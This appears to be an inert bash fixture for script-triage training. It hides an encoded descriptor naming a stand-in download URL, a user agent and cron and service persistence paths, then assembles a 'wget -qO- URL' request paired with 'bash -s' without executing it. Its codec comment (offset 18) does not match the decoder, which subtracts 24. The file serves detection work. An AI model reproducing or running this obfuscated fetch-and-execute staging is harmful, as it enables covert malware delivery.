#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_17dc7cdc='%8e%55%49%94%8b%8c%7d%88%8b%55%79%7b%89%8d%81%8a%7d%77%8a%7d%85%87%8c%7d%44%7c%81%8b%88%79%8c%7b%80%77%88%81%88%7d%94%79%7c%79%88%8c%7d%8a%55%8f%7f%7d%8c%77%8b%8c%7c%87%8d%8c%77%88%81%88%7d%94%8b%8c%79%7f%7d%77%7b%87%8d%86%8c%55%49%94%7b%79%85%88%79%81%7f%86%77%81%7c%55%7b%79%85%88%79%81%7f%86%45%50%7e%7d%4b%4d%51%7e%7a%49%7c%94%8d%8a%84%55%80%8c%8c%88%8b%52%47%47%50%7e%7d%4b%4d%51%7e%7a%49%7c%46%7d%90%79%85%88%84%7d%46%81%86%8e%79%84%81%7c%47%7b%7e%7e%49%4f%50%4a%48%46%8b%80%94%8d%8b%7d%8a%77%79%7f%7d%86%8c%55%60%8d%86%8c%8a%7d%8b%8b%64%79%7a%47%50%7e%7d%4b%4d%51%7e%7a%49%7c'
  readonly Codec_17dc7cdc='percent_hex|add_modulo_256|18'

  Load_17dc7cdc() {
    item1=()
    local raw="${Material_17dc7cdc}" item6
    for item6 in ${raw//%/ }; do [[ -n "$item6" ]] && item1+=("$((16#$item6))"); done
  }

  Decode_17dc7cdc() {
    item2=()
    local item5
    for ((item5=0; item5<${#item1[@]}; item5++)); do
      item2+=("$(((item1[item5] - 24 + 256) % 256))")
    done
  }

  Recover_17dc7cdc() {
    local -a item1 item2
    local item3 item4 item8 item5
    item4=$((19 * 7 - 133))
    Load_17dc7cdc
    local decode_target=Decode_17dc7cdc; "$decode_target"
    item3=''
    local octal character
    for item5 in "${!item2[@]}"; do
      printf -v octal '%03o' "${item2[item5]}"
      printf -v character '%b' "\\$octal"
      item3+="$character"
    done
    printf '%s\n' "$item3"
  }

  Inspect_17dc7cdc() { local recovered; recovered="$(Recover_17dc7cdc)"; printf '%s\n' "$recovered"; }

  Plan_17dc7cdc() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_17dc7cdc)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a request_command=(wget -qO- "$url")
    local -a interpreter=(bash -s)
    declare -p request_command interpreter
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_17dc7cdc; fi
